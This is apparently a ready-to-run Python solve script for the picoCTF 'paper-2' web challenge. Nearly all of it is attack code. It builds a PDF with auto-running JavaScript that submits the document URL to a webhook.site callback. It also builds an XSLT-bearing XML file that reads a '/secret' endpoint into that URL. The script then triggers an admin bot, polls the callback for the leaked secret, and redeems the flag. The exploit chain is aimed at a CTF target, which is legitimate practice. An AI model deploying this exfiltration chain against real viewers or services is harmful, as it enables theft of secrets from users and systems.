#save it using nano solve.py   then run with python3 solve.py  instance
#!/usr/bin/env python3
import argparse
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_opener(*handlers):
    context = ssl._create_unverified_context()
    return urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=context),
        *handlers,
    )


def http_request(url, method="GET", data=None, headers=None, opener=None, timeout=20):
    if opener is None:
        opener = build_opener()
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.getcode(), resp.info(), resp.read(), resp.geturl()
    except urllib.error.HTTPError as err:
        return err.code, err.headers, err.read(), err.geturl()


def multipart_body(field_name, filename, content_type, data):
    boundary = "----paper2-" + uuid.uuid4().hex
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n"
        "\r\n"
    ).encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    return boundary, head + data + tail


def upload_file(base_url, filename, content_type, data):
    boundary, body = multipart_body("file", filename, content_type, data)
    opener = build_opener(NoRedirectHandler)
    status, headers, _, _ = http_request(
        urllib.parse.urljoin(base_url, "/upload"),
        method="POST",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        opener=opener,
    )
    if status not in {302, 303}:
        raise RuntimeError(f"upload failed with HTTP {status}")
    location = headers.get("Location")
    if not location:
        raise RuntimeError("upload response did not include a Location header")
    match = re.search(r"/paper/(\d+)", location)
    if not match:
        raise RuntimeError(f"could not parse paper id from redirect {location!r}")
    return match.group(1)


def pdf_escape_literal(text):
    return (
        text.replace("\\", "\\\\")
        .replace("(", "\\(")
        .replace(")", "\\)")
        .replace("\r", "\\r")
        .replace("\n", "\\n")
    )


def build_pdf(callback_url):
    open_js = "app.setTimeOut(\"this.getField('x').value='go';\", 100);"
    submit_js = f"this.submitForm('{callback_url}?u='+encodeURIComponent(this.URL));"
    return f"""%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R /AcroForm << /Fields [5 0 R] >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /S /JavaScript /JS ({pdf_escape_literal(open_js)}) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] /Annots [5 0 R] /Contents 6 0 R >>
endobj
5 0 obj
<< /Type /Annot /Subtype /Widget /FT /Tx /T (x) /Rect [20 20 120 40] /AA << /K << /S /JavaScript /JS ({pdf_escape_literal(submit_js)}) >> >> >>
endobj
6 0 obj
<< /Length 35 >>
stream
BT /F1 12 Tf 20 200 Td (hello) Tj ET
endstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF
""".encode()


def build_stage1_xml(pdf_id):
    return f"""<!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #IMPLIED> ]>
<?xml-stylesheet type="text/xsl" href="#xsl"?>
<doc xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:stylesheet version="1.0" id="xsl">
    <xsl:template match="/">
      <html>
        <body>
          <iframe src="/paper/{pdf_id}#{{document('/secret')/body/@secret}}" width="1" height="1" style="border:0"></iframe>
        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
</doc>
""".encode()


def create_webhook_token():
    status, _, body, _ = http_request(
        "https://webhook.site/token",
        method="POST",
        headers={"Accept": "application/json"},
    )
    if status not in {200, 201}:
        raise RuntimeError(f"failed to create webhook.site token: HTTP {status}")
    data = json.loads(body)
    return data["uuid"]


def poll_webhook_for_secret(token, timeout):
    api_url = f"https://webhook.site/token/{token}/requests?sorting=newest&per_page=100"
    deadline = time.time() + timeout
    seen = set()
    while time.time() < deadline:
        status, _, body, _ = http_request(api_url, headers={"Accept": "application/json"})
        if status == 200:
            data = json.loads(body)
            for entry in data.get("data", []):
                request_id = entry.get("uuid")
                if request_id in seen:
                    continue
                seen.add(request_id)
                query = entry.get("query") or {}
                leaked = query.get("u")
                if isinstance(leaked, list):
                    leaked = leaked[0] if leaked else None
                if not leaked:
                    continue
                secret = urllib.parse.urlparse(leaked).fragment
                if re.fullmatch(r"[0-9a-f]{32}", secret):
                    return secret, leaked
        time.sleep(1)
    raise TimeoutError("timed out waiting for the leaked secret")


def trigger_visit(base_url, paper_id):
    status, _, body, _ = http_request(urllib.parse.urljoin(base_url, f"/visit/{paper_id}"))
    if status != 200:
        raise RuntimeError(f"/visit failed with HTTP {status}")
    text = body.decode("utf-8", "replace").strip()
    if text != "visiting!":
        raise RuntimeError(f"unexpected /visit response: {text!r}")


def redeem_flag(base_url, secret):
    url = urllib.parse.urljoin(base_url, f"/flag?secret={secret}")
    status, _, body, _ = http_request(url)
    if status != 200:
        raise RuntimeError(f"/flag failed with HTTP {status}")
    return body.decode("utf-8", "replace").strip()


def main():
    parser = argparse.ArgumentParser(
        description="Exploit picoCTF paper-2 with a webhook.site callback."
    )
    parser.add_argument("base_url", help="Challenge base URL")
    parser.add_argument("--timeout", type=int, default=75, help="Seconds to wait for the bot callback")
    parser.add_argument("--webhook-token", help="Reuse an existing webhook.site token instead of creating a fresh one")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    token = args.webhook_token or create_webhook_token()
    callback_url = f"https://webhook.site/{token}"

    print(f"[+] webhook token: {token}")
    print(f"[+] callback URL: {callback_url}")

    pdf_id = upload_file(base_url, "stage2.pdf", "application/pdf", build_pdf(callback_url))
    print(f"[+] uploaded stage 2 PDF as /paper/{pdf_id}")

    stage1_id = upload_file(base_url, "stage1.xml", "application/xml", build_stage1_xml(pdf_id))
    print(f"[+] uploaded stage 1 XML as /paper/{stage1_id}")

    trigger_visit(base_url, stage1_id)
    print("[+] bot triggered")

    secret, leaked_url = poll_webhook_for_secret(token, args.timeout)
    print(f"[+] leaked URL: {leaked_url}")
    print(f"[+] secret: {secret}")

    flag = redeem_flag(base_url, secret)
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(1)
